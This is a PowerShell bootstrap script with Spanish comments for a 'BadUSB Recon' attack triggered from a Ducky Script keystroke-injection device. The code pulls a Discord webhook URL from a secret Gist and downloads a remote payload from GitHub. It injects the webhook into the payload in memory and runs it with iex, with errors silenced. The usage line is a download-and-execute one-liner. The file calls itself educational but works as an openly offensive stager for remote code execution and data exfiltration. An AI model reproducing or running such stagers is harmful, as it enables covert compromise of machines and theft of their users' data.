# ============================================================
# BadUSB Recon - Bootstrap
# ------------------------------------------------------------
# Descarga el webhook desde un Gist secreto, descarga el
# payload principal, inyecta el webhook en memoria y lo ejecuta.
#
# Uso (desde el Ducky Script o manualmente):
#   iex(iwr '<raw-url-de-este-archivo>' -UseBasicParsing).Content
#
# Entorno : Windows 10/11, PowerShell 5.1+
# Uso     : Educativo / laboratorio propio
# Autor   : 14ND3R
# Repo    : https://github.com/AndYLndR/badusb-recon
# ============================================================

$ErrorActionPreference = "SilentlyContinue"

# ------------------------------------------------------------
# CONFIGURACION
# Cambia estas URLs por las tuyas.
# ------------------------------------------------------------

# URL raw de tu Gist secreto con el webhook de Discord.
# Formato del Gist: { "webhook": "https://gist.githubusercontent.com/AndYLndR/356d9985092035a14b4121f1bd35dbe6/raw/b260b94bc416cd94bb5caa1dac1783a8ea30e665/config.json" }
$ConfigUrl = "https://gist.githubusercontent.com/AndYLndR/356d9985092035a14b4121f1bd35dbe6/raw/b260b94bc416cd94bb5caa1dac1783a8ea30e665/config.json"

# URL raw del payload principal en el repo.
$PayloadUrl = "https://raw.githubusercontent.com/AndYLndR/badusb-recon/refs/heads/main/payloads/payload.ps1"

# ------------------------------------------------------------
# 1. Descargar la configuracion (webhook)
# ------------------------------------------------------------
try {
    $rawConfig = (iwr $ConfigUrl -UseBasicParsing).Content -join "`n"
    $config = $rawConfig | ConvertFrom-Json
    $webhook = $config.webhook
} catch {
    Write-Host "[-] No se pudo descargar la configuracion desde $ConfigUrl" -ForegroundColor Red
    exit 1
}

if (-not $webhook -or $webhook -notmatch "^https?://") {
    Write-Host "[-] El webhook del Gist no es valido." -ForegroundColor Red
    exit 1
}

# ------------------------------------------------------------
# 2. Descargar el payload principal
# ------------------------------------------------------------
try {
    $payload = (iwr $PayloadUrl -UseBasicParsing).Content -join "`n"
} catch {
    Write-Host "[-] No se pudo descargar el payload desde $PayloadUrl" -ForegroundColor Red
    exit 1
}

if (-not $payload -or $payload.Length -lt 100) {
    Write-Host "[-] El payload descargado esta vacio o es demasiado corto." -ForegroundColor Red
    exit 1
}

# ------------------------------------------------------------
# 3. Inyectar el webhook en el payload (en memoria)
# ------------------------------------------------------------
$payload = $payload -replace "PLACEHOLDER_WEBHOOK", $webhook

# ------------------------------------------------------------
# 4. Ejecutar el payload
# ------------------------------------------------------------
iex $payload

Write-Host "[+] Bootstrap completado." -ForegroundColor Green
